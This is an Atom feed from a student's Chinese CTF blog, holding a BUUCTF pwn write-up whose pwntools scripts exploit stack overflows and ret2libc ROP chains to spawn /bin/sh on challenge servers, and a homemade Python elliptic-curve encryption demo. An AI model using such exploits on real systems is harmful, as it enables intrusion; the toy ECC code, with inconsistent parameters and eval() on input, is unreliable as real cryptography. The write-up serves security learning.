<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>汐白的学习档案</title>
  
  <subtitle>小萌新一枚QAQ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xibai.xyz/"/>
  <updated>2020-06-04T15:18:14.357Z</updated>
  <id>http://xibai.xyz/</id>
  
  <author>
    <name>Ximu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>最近更新</title>
    <link href="http://xibai.xyz/2020/05/17/recently/"/>
    <id>http://xibai.xyz/2020/05/17/recently/</id>
    <published>2020-05-17T15:15:11.000Z</published>
    <updated>2020-06-04T15:18:14.357Z</updated>
    
    <content type="html"><![CDATA[<h2 id="这里列出最近半个月有更新过的内容"><a href="#这里列出最近半个月有更新过的内容" class="headerlink" title="这里列出最近半个月有更新过的内容"></a>这里列出最近半个月有更新过的内容</h2><h3 id="6-4"><a href="#6-4" class="headerlink" title="6.4"></a>6.4</h3><p><a href="http://xibai.xyz/2020/05/03/BUU-Pwn-one/">BUU-Pwn-one</a></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF-PWN(一)</title>
    <link href="http://xibai.xyz/2020/05/03/BUU-Pwn-one/"/>
    <id>http://xibai.xyz/2020/05/03/BUU-Pwn-one/</id>
    <published>2020-05-03T09:03:11.000Z</published>
    <updated>2020-06-04T15:28:12.111Z</updated>
    
    <content type="html"><![CDATA[<p><strong>最近更新：</strong> <em>2020-01-31 22:43</em></p><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>pwnの签到</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>入门溢出覆盖 RIP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'a'</span>*<span class="number">23</span>+p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>同上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">fi = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26624</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">fi.recvuntil(<span class="string">'WOW:'</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = fi.recv()[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(int(flag_addr,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">fi.sendline(payload)</span><br><span class="line"></span><br><span class="line">fi.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>加了个简易路障，输入长度被限制不能直接溢出，但是程序会把‘I’替换为‘you’，计算一下就会知道，只要输入21个‘I’即可进行后续的溢出操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./pwn1_sctf_2016')</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28810</span>)</span><br><span class="line">payload = <span class="string">'I'</span>*<span class="number">21</span> + <span class="string">'a'</span> + p32(<span class="number">0x8048f13</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>依旧是简单的额变量溢出覆盖，将<code>float</code>变量覆盖为相应的十六进制即可。这里可以直接百度 float 变量的数据是如何解析的，然后构造相应的二进制或十六进制数值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./ciscn_2019_n_1')</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29674</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>我丢！！！Ubuntu18坑死窝惹555<br>用了好几天时间换各种姿势尝试拿服务器shell，本地的kali明明可以一遍通QAQ。最后无奈搜了大佬的wp才知道Ubuntu18的堆栈对齐问题导致无法执行<code>system</code>函数，而且最后也不知道详细的底层机制原理是啥，只知道Ubuntu18的堆栈对齐很迷，这道题是32字节的对齐宽度，在payload前面加一个<code>ret</code>的地址即可完成对齐。<br>另外，中间尝试通过<code>gets</code>和<code>__isoc99_scanf</code>函数向bss段写入数据，但是无法写入(工具查看是有RW权限的)，疑惑，实在没找到原因，如果写入成功的话或许可以尝试<code>ret2csu</code>来执行<code>execve</code>，这应该不会受到栈对齐的影响.<br>(数次调试后发现，该程序bss段无法写入数据md，不过发现<code>one_gadget</code>可以用)</p><p><strong>继续查资料依旧没有找到Ubuntu18栈对齐对函数能否成功执行的影响原理，只知道堆栈指针对齐一般是16字节或32字节的对齐，其会在某些情况下影响程序的正常执行，而这道题显然就遇到了这‘某些情况’</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/root/BUU/pwn/libc/ubuntu18/64/libc-2.27.so'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line">encrypt = p64(elf.symbols[<span class="string">'encrypt'</span>])</span><br><span class="line">libc_start_main_addr = p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts = p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">rdi_ret = p64(<span class="number">0x400c83</span>)</span><br><span class="line">binsh_64 = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x58</span> + rdi_ret + libc_start_main_addr + puts + encrypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./ciscn_2019_c_1')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26004</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Ciphertext\x0a\x0a'</span>)</span><br><span class="line"></span><br><span class="line">tmp_addr = u64(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">base = tmp_addr - libc_start_main</span><br><span class="line">binsh_64 += base</span><br><span class="line">system += base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x58</span> + p64(<span class="number">0x4006b9</span>) + rdi_ret + p64(binsh_64) + p64(system) + encrypt</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>简单ROP，用<code>\x00</code>绕过<code>strncmp</code>检测，然后溢出复写第二个<code>read</code>读入长度为255.<br>利用write函数泄露got表中已经被用过的函数地址，计算基地址，本题直接给出so文件，直接计算<code>system</code>函数和<code>/bin/sh</code>的地址。这里system直接攻击成功。不再尝试其他姿势。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29623</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">write = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_addr = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(write) + p32(main) + p32(<span class="number">1</span>) + p32(write_addr) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + base</span><br><span class="line">binsh = libc.search(<span class="string">'/bin/sh\x00'</span>).next() + base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>我吐了，emp无敌。这道题看源码发现和上面<code>ciscn_2019_c_1</code>一模一样，但是exp打了好几遍就是打不通，本地是可以通的。无奈搜别的大佬的wp看是不是又有什么奇怪的姿势，发现确实是和上一题的共用一个exp就可以。<br>这里看到大佬用的<code>libcsearcher</code>而非BUU直接给出的libc，就去试了下libcsearcher尝试是不是libc的问题，然后就神奇的通了。。。但这里不是吐血的地方！<br>最神奇和吐血的地方是，这个时候因为<strong>觉得BUU一般的pwn题应该就是用的直接给出的对应的libc才对</strong>就把后来加上的<code>libcsearcher</code>相关的代码<strong>全删了用之前没改的代码，这一次突然就通了</strong>！？？？吐血emmm</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>(密码学)(crypto)ECC_Crypto(椭圆曲线加密)——python实现</title>
    <link href="http://xibai.xyz/2020/04/30/(crypto)ECC_Crypto/"/>
    <id>http://xibai.xyz/2020/04/30/(crypto)ECC_Crypto/</id>
    <published>2020-04-29T17:14:37.531Z</published>
    <updated>2020-05-13T07:34:58.671Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 辗转相除求最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div_fac</span><span class="params">( a, b )</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b !=  <span class="number">0</span>:</span><br><span class="line">        result = div_fac( b, a % b )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = a</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将负数结果转化为正数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_neg</span><span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="keyword">while</span> a &lt;= <span class="number">0</span>:</span><br><span class="line">        a += b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用勒让德符号和二次互反律判断平方剩余是否存在</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Leg_Prime</span><span class="params">( a , p )</span>:</span></span><br><span class="line">    a = a % p  </span><br><span class="line">    flag = <span class="number">1</span> ; a_x = [] ; i = <span class="number">2</span> ; tmp = a</span><br><span class="line">    <span class="keyword">while</span> i &lt; tmp ** <span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">if</span> tmp % i == <span class="number">0</span>:</span><br><span class="line">            tmp //= i</span><br><span class="line">            a_x.append(i)</span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a_x.append(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a_x:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">1</span> <span class="keyword">or</span> p % <span class="number">8</span> == <span class="number">7</span>:</span><br><span class="line">                flag *= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag *= ( <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">-1</span> <span class="keyword">or</span> a == p<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">                flag *= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag *= ( <span class="number">-1</span> )</span><br><span class="line">        <span class="comment">#flag_tmp = ( -1 ) ** (( a - 1 ) * ( p - 1 ) / 4) * Leg_Prime( p % i , i )</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag *= ( ( <span class="number">-1</span> ) ** (( a - <span class="number">1</span> ) * ( p - <span class="number">1</span> ) / <span class="number">4</span> ) ) * Leg_Prime( p , i )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># ECC加密中的加法运算实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Add</span><span class="params">( A , B , p , a)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> A != B:</span><br><span class="line">        dx = A[<span class="number">0</span>] - B[<span class="number">0</span>]</span><br><span class="line">        dy = A[<span class="number">1</span>] - B[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dy = <span class="number">3</span> * ( A[<span class="number">0</span>] ** <span class="number">2</span> ) + a</span><br><span class="line">        dx = <span class="number">2</span> * A[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> dx == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    fac = div_fac( dx , dy )</span><br><span class="line">    dy //= fac</span><br><span class="line">    dx //= fac</span><br><span class="line">    tmp = dy % p</span><br><span class="line">    check_neg( tmp , p )</span><br><span class="line">    <span class="keyword">while</span> tmp % dx != <span class="number">0</span>:</span><br><span class="line">        tmp += p</span><br><span class="line">    k = tmp // dx</span><br><span class="line">    C_x = ( k ** <span class="number">2</span> - A[<span class="number">0</span>] - B[<span class="number">0</span>] ) % p</span><br><span class="line">    check_neg( C_x , p )</span><br><span class="line">    C_y = ( k * ( A[<span class="number">0</span>] - C_x ) - A[<span class="number">1</span>] ) % p</span><br><span class="line">    check_neg( C_y , p )</span><br><span class="line">    <span class="keyword">return</span> (C_x,C_y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基点的阶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_Order</span><span class="params">( G , p , a )</span>:</span></span><br><span class="line">    flag = <span class="number">1</span> ; A = G ; B = G</span><br><span class="line">    <span class="keyword">while</span> flag :</span><br><span class="line">        flag += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> (( A[<span class="number">0</span>] ** <span class="number">3</span> + A[<span class="number">0</span>] + <span class="number">1</span> ) % p ) == (( A[<span class="number">1</span>] ** <span class="number">2</span> ) % p ):</span><br><span class="line">            <span class="keyword">if</span> A[<span class="number">0</span>] == G[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">return</span> flag + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Error!!!"</span>)</span><br><span class="line">            print(<span class="string">"在第 "</span> + str(flag) + <span class="string">" 次运算后结果错误！"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求取公钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_PublickeyFind</span><span class="params">(p,a,G,d)</span>:</span></span><br><span class="line">    A = G ; B = G</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; d:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> A == <span class="number">0</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            A = G</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文嵌入曲线</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_M</span><span class="params">(m,p,a,b)</span>:</span></span><br><span class="line">    M = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m.encode(<span class="string">'utf-8'</span>):</span><br><span class="line">        j = j * <span class="number">30</span></span><br><span class="line">        tmp = <span class="number">0</span> ; flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> tmp &lt; <span class="number">100</span>:</span><br><span class="line">            x = j + tmp</span><br><span class="line">            y_2 = ( x ** <span class="number">3</span> + a * x + b ) % p</span><br><span class="line">            tmp += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> Leg_Prime( y_2 , p ) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,p):</span><br><span class="line">                    <span class="keyword">if</span> ( i ** <span class="number">2</span> - y_2 ) % p == <span class="number">0</span>:</span><br><span class="line">                        M.append(( x , i ))</span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"明文某字节在嵌入曲线时 100 次没有得到平方剩余"</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_encode</span><span class="params">(M,G,K,r,p,a)</span>:</span></span><br><span class="line">    r_G = ECC_PublickeyFind(p,a,G,r)</span><br><span class="line">    r_K = ECC_PublickeyFind(p,a,K,r)</span><br><span class="line">    C_1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> M:</span><br><span class="line">        C_1.append(ECC_Add(i,r_K,p,a))</span><br><span class="line">    print(<span class="string">"C1为:"</span>,end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> C_1:</span><br><span class="line">        print(str(i) + <span class="string">','</span> ,end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print()</span><br><span class="line">    print(<span class="string">"C2为:"</span> + str(r_G))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Encrypt</span><span class="params">(p,a,b,G,n,d,m)</span>:</span></span><br><span class="line">    K = ECC_PublickeyFind(p,a,G,d)</span><br><span class="line">    print(<span class="string">"公钥为："</span> + str(K))</span><br><span class="line">    M = ECC_M(m,p,a,b)</span><br><span class="line">    r = random.randint(<span class="number">1</span>,n<span class="number">-1</span>)</span><br><span class="line">    ECC_encode(M,G,K,r,p,a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Decrypt</span><span class="params">(C1,C2,d,p,a)</span>:</span></span><br><span class="line">    C2_tmp = ECC_PublickeyFind(p,a,C2,d)</span><br><span class="line">    C2 = (C2_tmp[<span class="number">0</span>],-C2_tmp[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> C1:</span><br><span class="line">        M = ECC_Add(i,C2,p,a)[<span class="number">0</span>] // <span class="number">30</span></span><br><span class="line">        print(chr(M),end=<span class="string">''</span>)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p,a,b,G,n = <span class="number">4177</span>,<span class="number">1</span>,<span class="number">1</span>,(<span class="number">0</span>,<span class="number">1</span>),<span class="number">28</span></span><br><span class="line">    print(<span class="string">"本程序使用曲线方程为：y^2 = x^3 + x + 1"</span>)</span><br><span class="line">    print(<span class="string">"参数 p 选择为 23，基点为 (0,1), n 为 28"</span>)</span><br><span class="line">    print(<span class="string">"为减小计算压力，本程序为ASCII字符集逐字节加密"</span>)</span><br><span class="line">    d = eval(input(<span class="string">"请输入私钥："</span>))</span><br><span class="line">    m = input(<span class="string">"请输入要加密的数据："</span>)</span><br><span class="line"></span><br><span class="line">    ECC_Encrypt(p,a,b,G,n,d,m)</span><br><span class="line"></span><br><span class="line">    C1 = eval(input(<span class="string">"请输入C1:"</span>))</span><br><span class="line">    C2 = eval(input(<span class="string">"请输入C2:"</span>))</span><br><span class="line"></span><br><span class="line">    ECC_Decrypt(C1,C2,d,p,a)</span><br></pre></td></tr></table></figure>]]></content>
